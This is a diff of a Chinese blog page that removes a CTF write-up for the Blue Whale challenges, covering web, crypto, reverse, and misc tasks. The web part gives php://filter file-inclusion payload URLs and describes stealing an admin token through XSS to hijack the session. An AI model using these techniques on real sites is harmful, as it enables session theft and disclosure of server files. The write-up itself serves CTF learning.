-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vps1.blue-whale.me:23360&#x2F;user&#x2F;d9941e23fbdce38d1bd72f07d158c20da1001bd0&#x2F;index.php?content[]&#x3D;php</span><br></pre></td></tr></table></figure>
-
-<p>在./config.php中即可获取flag。</p>
-<h2 id="Baby-XSS"><a href="#Baby-XSS" class="headerlink" title="Baby XSS"></a>Baby XSS</h2><p>这道题主要考察的是XSS平台的使用和对token的理解。flag在admin.php中，但是只有admin可以打开。因此确定思路：通过XSS获取管理员token，用burpsuit截获数据包，更改为管理员的token获取flag。</p>
-<p>题目提供了一个XSS平台，注册之后新建项目-使用默认模块即可生成所需的payload，把payload写入message，然后计算验证码即可。验证码的md5值的前六位与后面的字符串一致即可，可以写脚本爆破：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999999</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i)).startswith(<span class="string">'6dde1d'</span>):</span><br><span class="line">    	<span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>
-
-<p>提交后回到XSS平台查看项目，这里的token就是admin的token。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" alt></p>
-<p>利用Burpsuit拦截http包，将cookie替换为如上admin的token即可获取flag。</p>
-<h2 id="BasicFileInclude"><a href="#BasicFileInclude" class="headerlink" title="BasicFileInclude"></a>BasicFileInclude</h2><p>点击flag，提示ha ha? you want flag? flag is here, but don’t let you see!思路很明确，flag就在这里，用php://filter来获取源码。</p>
-<p>php://filter可以作为一个中间流来处理其他流，可以进行任意文件的读取，有一个必选参数resource和两个可选参数：read、write。采用base64编码读取一是可以避免一些特殊字符的编码问题，另一方面可以避免php死亡exit等不必要的麻烦。payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vps1.blue-whale.me:23338&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>
-
-<p>得到base64编码后的源码，解码即可获取flag。</p>
-<p>虽然已经完成了规定的Web题，但还是打算继续往下做作，这个题的考察点就是抓包尝试拼接+LFI。首先打开题目，然后点CTF抓个包观送进Repeater里观察一下。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" alt></p>
-<p>发现Accept-Language的参数疑似被拼接到了要包含的文件中，再试一次，把Accept-Language的参数设置为flag发现确实被拼接进去了。那这道题的思路就很明确了，利用拼接和php://filter伪协议获取flag.php源码。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/13.png" alt></p>
-<p>在GET参数中配置php:拼接/再拼接Accept-Language中的/filter/convert.base64-encode/resource=flag最后再拼接上.php就可以完成本地文件包含了，base64解码即可得到flag。</p>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="What’s-RSA"><a href="#What’s-RSA" class="headerlink" title="What’s RSA"></a>What’s RSA</h2><p>题目给了加密文件flag.encrypt和私钥rsa_private_key.pem，可以直接用openssl解密文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.encrypt -inkey rsa_private_key.pem -out flag.txt</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Reverse-Sign-In"><a href="#Reverse-Sign-In" class="headerlink" title="Reverse Sign In"></a>Reverse Sign In</h2><p>是一道逆向签到题，签到级别的逆向暂时还在我能力范围内…首先下载文件扔进IDA，然后shift+F12搜索字符串，进入sub_4006E1，f5大法查看伪代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4006E1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx@7</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+0h] [bp-30h]@1</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+28h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>);</span><br><span class="line">  __isoc99_scanf();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400686((__int64)&amp;s) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从代码中可以看出当 s 符合sub_400686(&amp;s)函数的要求时输出“Right”，因此我们要跟进这个函数：</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" alt></p>
-<p>很好懂，就是进行了简单的异或，这里的a1是形参，实参是main函数的字符串s，现在需要提取byte_400818的数据，双击即可进入byte_400818：</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" alt></p>
-<p>2 dup(60h)的意思是两个60h，按h可以将其转换为十进制。到此为止可以写脚本解决这道题目了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8       </span></span><br><span class="line">n =  [<span class="number">102</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">127</span>, <span class="number">60</span>, <span class="number">54</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">100</span>, <span class="number">59</span>,<span class="number">123</span>, <span class="number">82</span>, <span class="number">124</span>, <span class="number">60</span>, <span class="number">102</span>, <span class="number">84</span>, <span class="number">96</span>, <span class="number">96</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">127</span>,<span class="number">113</span>, <span class="number">88</span>, <span class="number">82</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">117</span>, <span class="number">42</span>, <span class="number">98</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">31</span>):</span><br><span class="line">    print(chr(n[i] ^ i)),</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>签到，复制粘贴即可。</p>
-<h2 id="Poem"><a href="#Poem" class="headerlink" title="Poem"></a>Poem</h2><p>诗我就不吟了，不会背要罚抄100遍。</p>
-<h2 id="Another01Game"><a href="#Another01Game" class="headerlink" title="Another01Game"></a>Another01Game</h2><p>下载下来是1369个01，正好是37*37，利用Pillow库把这个二维码画出来：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">37</span></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(MAX,MAX))</span><br><span class="line">str =<span class="string">"0000000111011101100011011111010000000011111011011101111001100100101011111001000101011011101101000101010101000100100010110110011001101001010010100010010001011011001101000101010001010001001111101110001000011001010111101111100000000101010101010101010101010000000111111110110111010101100000011111111100010000011101110101010101010001110110001101110100010001010010100101010101011111001110010000110111000011110100111100011011100010110101001011101101001110100101101100101100110110110100010010010100100110010101110101010101010111111000000110111100001100111101000101001101110101110101110001010001010010011110010101011100010101111101001001101000111101000100110101010010011001010110000100000100010110010101010111010100101110101000100101110101010111010100000100000011001101010100011111010010100101011001100101010101110100100100100010010101101111010100111011001001001100010110011101000011110101110001011100000011110111010110001011111000010110001101110001001001010111101101000001111100111001000100110110100001101011001011011010001000011001011001100000010111000110110001011001010100000100011111111000011001010110011000111001010000000100111011101101110001010101000011111010100111001101010110101110001001000101001101110011001111100000001010100010110000011000011101010001000100010001010000010101001010101101000001001111101001100000101100011101000100110000000100101100100011011011001010110"</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">'1'</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>啧，黑白猜反了，但是无伤大雅，反色即可扫描二维码，得到新的01字符串。题目说新的01字符串当作ASCII编程即可，照做得到flag。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">'110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101'</span></span><br><span class="line">i=<span class="number">0</span>;</span><br><span class="line">s=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">    s=s+<span class="string">''</span>+c;</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">        a = int(s,<span class="number">2</span>)</span><br><span class="line">        print(chr(a),end=<span class="string">""</span>)</span><br><span class="line">        s=<span class="string">'0'</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>提示了Red Plane 0，Stegsolve照着做就vans了。扫码得到flag。</p>
-<h2 id="Exif"><a href="#Exif" class="headerlink" title="Exif"></a>Exif</h2><p>题目已经说了EXIF，找一个EXIF信息查看器得到credit：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102,108,97,103,123,101,120,105,102,95,104,105,100,100,101,110,95,102,108,52,103,125</span><br></pre></td></tr></table></figure>
-
-<p>ASCII解码即可得到flag。</p>
-<h2 id="docx"><a href="#docx" class="headerlink" title="docx"></a>docx</h2><p>是一道word隐写题，把docx后缀名改成zip，解压之后就能拿到Flag.xml了。</p>
-<h2 id="Forensics1"><a href="#Forensics1" class="headerlink" title="Forensics1"></a>Forensics1</h2><p>这个题目提示了关注HTTP部分，下载之后用wireshark打开，过滤出http，观察一下数据包。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" alt></p>
-<p>发现以GET方式请求了一张名为s3cret.png的图片，怀疑flag就在图片里，下一步需要把图片还原。方法是file-Export Objects-HTTP，然后选中需要还原的图片即可。打开图片拿到flag。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" alt></p>
-<h2 id="Forensics2"><a href="#Forensics2" class="headerlink" title="Forensics2"></a>Forensics2</h2><p>题目提示something about file，打开数据包发现协议还不少，简单梳理一下数据包的内容：首先ping了一下，然后三次握手建立TCP连接，SSH远程连接之后使用NFS网络文件系统远程访问文件。结合题目给出的提示，高度怀疑flag在远程访问文件的时候出现，因此首先过滤出NFS协议。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" alt></p>
-<p>这里其实是NFS执行的一个写操作，虽然题很简单，但是也借此机会回顾一下NFS写操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">No.375 客户端向服务器查询自己的权限，RD、LU、MD、XT、DL</span><br><span class="line">No.376 服务器收到请求，返回allowed的权限 RD、LU、MD、XT、DL</span><br><span class="line">No.378 客户端请求服务器查找flag.txt.gz文件，要求返回其句柄</span><br><span class="line">No.379 服务器回应查找失败，没有此文件，并创建此文件，返回给客户端此文件句柄</span><br><span class="line">No.391 客户端利用句柄请求打开此文件</span><br><span class="line">No.395 服务器回应打开状态，返回操作的新的句柄</span><br><span class="line">No.400 客户端利用句柄在write文件写入信息</span><br><span class="line">No.401 服务器回应写入成功</span><br><span class="line">No.402 客户端请求关闭此文件</span><br><span class="line">No.403 服务器回应已经关闭</span><br></pre></td></tr></table></figure>
-
-<p>很显然，要找flag就应该在No.400处还原write文件写入的信息，果然在OpCode:Write 38中找到了data。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" alt></p>
-<p>在data这里右键-Show Packet Bytes-Decode As-Compressed即可解压查看flag。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" alt></p>
-<h2 id="Birthday"><a href="#Birthday" class="headerlink" title="Birthday"></a>Birthday</h2><p>直接用Ziperello爆破，密码是1995什么的记不清了，也懒得再爆破一次。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1706,7 +1602,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1719,7 +1615,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
